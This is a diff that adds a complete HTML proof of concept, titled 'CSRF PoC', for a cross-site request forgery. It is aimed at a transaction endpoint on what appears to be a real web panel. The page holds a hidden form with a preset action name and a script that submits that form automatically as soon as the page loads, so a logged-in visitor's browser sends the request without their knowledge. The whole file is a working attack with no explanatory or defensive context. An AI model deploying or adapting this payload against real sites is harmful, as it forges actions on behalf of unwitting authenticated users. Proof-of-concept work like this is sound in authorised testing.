@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>CSRF PoC</h3>
+<form action="https://panel.paperzero.com/Home/Transaction" method="POST">
+  <input type="hidden" name="name" value="LS.CORE.Cockpit.ViewCockpit">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>
+</html>
